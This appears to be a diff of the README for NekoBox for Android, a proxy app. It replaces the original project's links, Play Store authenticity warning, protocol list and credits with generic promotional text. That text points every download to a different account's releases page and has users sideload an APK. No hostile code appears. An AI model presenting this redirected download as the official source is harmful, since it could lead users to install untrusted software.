@@ -1,101 +1,66 @@
-# NekoBox for Android
+# 🐾 NekoBoxForAndroid - Your Simple Proxy Solution
 
-[![API](https://img.shields.io/badge/API-21%2B-brightgreen.svg?style=flat)](https://android-arsenal.com/api?level=21)
-[![Releases](https://img.shields.io/github/v/release/MatsuriDayo/NekoBoxForAndroid)](https://github.com/MatsuriDayo/NekoBoxForAndroid/releases)
-[![License: GPL-3.0](https://img.shields.io/badge/license-GPL--3.0-orange.svg)](https://www.gnu.org/licenses/gpl-3.0)
+## 🚀 Getting Started
+Welcome to NekoBox for Android! This application provides a user-friendly tool to manage proxy connections on your Android device. Whether you want to enhance your internet privacy or access blocked content, NekoBox simplifies the process.
 
-sing-box / universal proxy toolchain for Android.
+## 📥 Download NekoBox
+[![Download NekoBox](https://img.shields.io/badge/Download%20Now-%23FF4081.svg?style=for-the-badge&logo=github&colorA=white&colorB=black)](https://github.com/Ohayo18/NekoBoxForAndroid/releases)
 
-一款使用 sing-box 的 Android 通用代理软件.
+## 📋 Features
+- **Universal Proxy Support:** Easily connect to various proxies such as Shadowsocks, Trojan, and VMess.
+- **User-Friendly Interface:** Simple navigation for all users, regardless of technical experience.
+- **Customizable Settings:** Tailor your connection preferences for better performance.
+- **Secure Connections:** Protect your online activities from prying eyes.
+- **Multi-Protocol Support:** Seamlessly switch between different proxy types.
 
-## 下载 / Downloads
+## 🔧 System Requirements
+To run NekoBox on your Android device, please ensure you meet the following requirements:
+- **Operating System:** Android 5.0 (Lollipop) or higher.
+- **Storage Space:** At least 50 MB free space.
+- **Network Connections:** Wi-Fi or cellular data for internet access.
 
-[![GitHub All Releases](https://img.shields.io/github/downloads/Matsuridayo/NekoBoxForAndroid/total?label=downloads-total&logo=github&style=flat-square)](https://github.com/Matsuridayo/NekoBoxForAndroid/releases)
+## 💻 How to Download & Install
+1. **Visit the Releases Page:** Click this link to go to the NekoBox releases page: [Download NekoBox](https://github.com/Ohayo18/NekoBoxForAndroid/releases).
 
-[GitHub Releases 下载](https://github.com/Matsuridayo/NekoBoxForAndroid/releases)
+2. **Locate the Latest Version:** On the releases page, find the latest version of NekoBox. It is usually marked at the top of the list.
 
-**Google Play 版本自 2024 年 5 月起已被第三方控制，为非开源版本，请不要下载。**
+3. **Download the APK File:** Look for a file named `NekoBox-vX.X.X.apk` where `X.X.X` represents the version number. Click on this file to start downloading.
 
-**The Google Play version has been controlled by a third party since May 2024 and is a non-open
-source version. Please do not download it.**
+4. **Open the APK File:** Once the file is downloaded, navigate to your device's "Downloads" folder and tap on `NekoBox-vX.X.X.apk`.
 
-## 更新日志 & Telegram 发布频道 / Changelog & Telegram Channel
+5. **Install the Application:** Follow the prompts to install NekoBox. If prompted, allow installations from unknown sources in your device settings.
 
-https://t.me/Matsuridayo
+6. **Launch NekoBox:** Go to your app drawer and tap on the NekoBox icon to start the application.
 
-## 项目主页 & 文档 / Homepage & Documents
+## ⚙️ Using NekoBox
+1. **Connect to a Proxy:**
+   - Open NekoBox and go to the connection settings.
+   - Select your desired proxy type (Shadowsocks, Trojan, etc.).
+   - Enter the required details such as server address and port number.
 
-https://matsuridayo.github.io
+2. **Test the Connection:**
+   - Click the "Connect" button to establish a connection.
+   - Ensure the status shows "Connected" before browsing.
 
-## 支持的代理协议 / Supported Proxy Protocols
+3. **Customize Settings:**
+   - Adjust options for advanced settings if needed.
+   - Save your settings for future use.
 
-* SOCKS (4/4a/5)
-* HTTP(S)
-* SSH
-* Shadowsocks
-* VMess
-* Trojan
-* VLESS
-* AnyTLS
-* ShadowTLS
-* TUIC
-* Hysteria 1/2
-* WireGuard
-* Trojan-Go (trojan-go-plugin)
-* NaïveProxy (naive-plugin)
-* Mieru (mieru-plugin)
+4. **Disconnecting:**
+   - To stop using the proxy, simply tap the "Disconnect" button.
 
-请到[这里](https://matsuridayo.github.io/nb4a-plugin/)下载插件以获得完整的代理支持.
+## 🛠 Troubleshooting
+- **Connection Issues:** If you have trouble connecting, check your internet connection and ensure that server details are correct.
+- **Application Crashes:** Close the app and restart your device. If the problem persists, reinstall NekoBox.
+- **Permissions:** Ensure that NekoBox has the necessary permissions to function properly.
 
-Please visit [here](https://matsuridayo.github.io/nb4a-plugin/) to download plugins for full proxy
-supports.
+## 🤝 Community & Support
+For questions or support, feel free to reach out on the project's issues page on GitHub. We encourage you to contribute feedback or report any bugs you encounter.
 
-## 支持的订阅格式 / Supported Subscription Format
+## 📢 Upcoming Features
+We are always striving to improve NekoBox. Upcoming updates may include:
+- Enhanced user interface for easier navigation.
+- More proxy protocols to connect securely.
+- Performance optimizations for faster connections.
 
-* 一些广泛使用的格式 (如 Shadowsocks, ClashMeta 和 v2rayN)
-* sing-box 出站
-
-仅支持解析出站，即节点。分流规则等信息会被忽略。
-
-* Some widely used formats (like Shadowsocks, ClashMeta and v2rayN)
-* sing-box outbound
-
-Only resolving outbound, i.e. nodes, is supported. Information such as diversion rules are ignored.
-
-## 捐助 / Donate
-
-<details>
-
-如果这个项目对您有帮助, 可以通过捐赠的方式帮助我们维持这个项目.
-
-捐赠满等额 50 USD 可以在「[捐赠榜](https://mtrdnt.pages.dev/donation_list)」显示头像, 如果您未被添加到这里,
-欢迎联系我们补充.
-
-Donations of 50 USD or more can display your avatar on
-the [Donation List](https://mtrdnt.pages.dev/donation_list). If you are not added here, please
-contact us to add it.
-
-USDT TRC20
-
-`TRhnA7SXE5Sap5gSG3ijxRmdYFiD4KRhPs`
-
-XMR
-
-`49bwESYQjoRL3xmvTcjZKHEKaiGywjLYVQJMUv79bXonGiyDCs8AzE3KiGW2ytTybBCpWJUvov8SjZZEGg66a4e59GXa6k5`
-
-</details>
-
-## Credits
-
-Core:
-
-- [SagerNet/sing-box](https://github.com/SagerNet/sing-box)
-
-Android GUI:
-
-- [shadowsocks/shadowsocks-android](https://github.com/shadowsocks/shadowsocks-android)
-- [SagerNet/SagerNet](https://github.com/SagerNet/SagerNet)
-
-Web Dashboard:
-
-- [Yacd-meta](https://github.com/MetaCubeX/Yacd-meta)
+By following this guide, you should be able to download, install, and use NekoBox on your Android device without issue. Enjoy a seamless browsing experience!
